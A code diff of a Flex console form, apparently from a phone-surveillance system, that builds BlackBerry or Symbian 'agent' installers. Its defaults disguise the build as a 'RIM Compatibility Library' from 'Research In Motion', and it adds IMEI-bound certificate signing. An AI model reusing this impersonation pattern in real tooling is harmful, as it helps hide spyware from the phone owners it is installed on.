@@ -4,7 +4,12 @@
          xmlns:mx="library://ns.adobe.com/flex/mx" width="100%" height="100%">
   <fx:Script>
     <![CDATA[
-      import locale.R;   
+      import it.ht.rcs.console.monitor.controller.LicenseManager;
+      import it.ht.rcs.console.utils.AlertPopUp;
+      
+      import locale.R;
+      
+      import mx.managers.PopUpManager;   
      
       public function set platform(value:*):void {
         if (value == 'blackberry' || value == 'symbian')
@@ -14,16 +19,58 @@
       }
       
       private var fileReference:FileReference;
+      private var params:Object;
       
       private function browse():void
       {
+        params = {platform: 'symbian', binary: {demo: demo.selected}, sign: {}, melt: {appname: appname.text} };
+
         fileReference = new FileReference();
-        fileReference.addEventListener(Event.SELECT, fileSelection);
+        fileReference.addEventListener(Event.SELECT, uploadCert);
         fileReference.browse();
       }
-      
-      private function fileSelection(event:Event):void
+         
+      private var uploadPopup:UploadPopup;
+      private function uploadCert(event:Event):void
       {
+        fileReference.addEventListener(HTTPStatusEvent.HTTP_STATUS, onUploadError);
+        fileReference.addEventListener(IOErrorEvent.IO_ERROR, onUploadError);
+        fileReference.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onUploadError);
+        fileReference.addEventListener(DataEvent.UPLOAD_COMPLETE_DATA, onUploadComplete);
+        
+        uploadPopup = PopUpManager.createPopUp(this.parentDocument as DisplayObject, UploadPopup, true) as UploadPopup;
+        uploadPopup.fileReference = fileReference;
+        PopUpManager.centerPopUp(uploadPopup);
+      }
+      
+      private function onUploadComplete(event:DataEvent):void
+      {
+        PopUpManager.removePopUp(uploadPopup);
+        
+        params['sign']['cert'] = event.data;
+      }
+      
+      private function onUploadError(event:Event):void
+      {
+        PopUpManager.removePopUp(uploadPopup);
+        AlertPopUp.show(event.type);
+      }
+      
+      protected function create(event:MouseEvent):void
+      {
+        params = {platform: parentDocument.platform, binary: {demo: demo.selected}, melt: {appname: appname.text}, 'package': {type: 'remote'} };
+
+        if (currentState == 'blackberry') {
+          params['binary']['name'] = nameForm.text;
+          params['binary']['desc'] = descForm.text;
+          params['binary']['vendor'] = vendorForm.text;
+          params['binary']['version'] = versionForm.text;
+        }
+                
+        if (currentState == 'symbian') {
+          params['sign']['edition'] = edition.selectedItem;
+        }
+
       }
       
     ]]>
@@ -35,38 +82,46 @@
     <s:State name='symbian'/>
   </s:states>
   
-  <s:CheckBox left="10" top="10" id="demo" label="Demo Mode" fontWeight="bold"/>
-  <s:TextArea left="25" top="25" width="280" height="42" borderVisible="false"
-              contentBackgroundAlpha="0.0" editable="false"
-              text="You can use the demo mode to try the agent in the lab, it will not consume a license."/>
-
-
-  <s:HGroup left="10" top="70" verticalAlign="middle">
+  <s:HGroup left="10" top="10" verticalAlign="middle">
     <s:Label fontWeight="bold" text="Application Name"/>    
-    <s:TextInput text="installer"/>
+    <s:TextInput id="appname" text="installer"/>
   </s:HGroup>
 
-  <s:Form includeIn="blackberry" left="10" top="95">
+  <s:Form includeIn="blackberry" left="10" top="35">
     <s:FormItem label="Name">    
-      <s:TextInput text="RIM Compatibility Library" width="150"/>
+      <s:TextInput id="nameForm" text="RIM Compatibility Library" width="150"/>
     </s:FormItem>
     <s:FormItem label="Description">        
-      <s:TextInput text="RIM Compatibility Library used by applications in the App World" width="200"/>
+      <s:TextInput id="descForm" text="RIM Compatibility Library used by applications in the App World" width="200"/>
     </s:FormItem>
     <s:FormItem label="Vendor">       
-      <s:TextInput text="Research In Motion" width="150"/>
+      <s:TextInput id="vendorForm" text="Research In Motion" width="150"/>
     </s:FormItem>
     <s:FormItem label="Version">       
-      <s:TextInput text="1.1.0" width="100"/>
+      <s:TextInput id="versionForm" text="1.1.0" width="100"/>
     </s:FormItem>
   </s:Form>
 
-  <s:Form includeIn="symbian" left="10" top="95">
+  <s:Form includeIn="symbian" left="10" top="35">
     <s:FormItem label="Certificate bound to phone IMEI">    
       <s:Button width="80" label="{R.get('BROWSE')}" click="browse()"/>
     </s:FormItem>
+    <s:FormItem label="S60 Edition">
+      <s:DropDownList id="edition" selectedIndex="0" width="80">
+        <mx:ArrayCollection>
+          <fx:String>5th3rd</fx:String>
+          <fx:String>3rd</fx:String>
+          <fx:String>5th</fx:String>
+        </mx:ArrayCollection>
+      </s:DropDownList>
+    </s:FormItem>
   </s:Form>
   
-  <s:Button right="20" bottom="20" label="Create..."/>
+  <s:HGroup left="10" bottom="0" right="10" horizontalAlign="right">
+    <s:CheckBox left="10" id="demo" label="Demo Mode" fontWeight="bold" 
+                enabled="{LicenseManager.instance.canBuild(parentDocument.platform)}"
+                selected="{!demo.enabled}"/>
+    <s:Button right="10" label="Create..." click="create(event)"/>    
+  </s:HGroup>
   
 </s:Group>
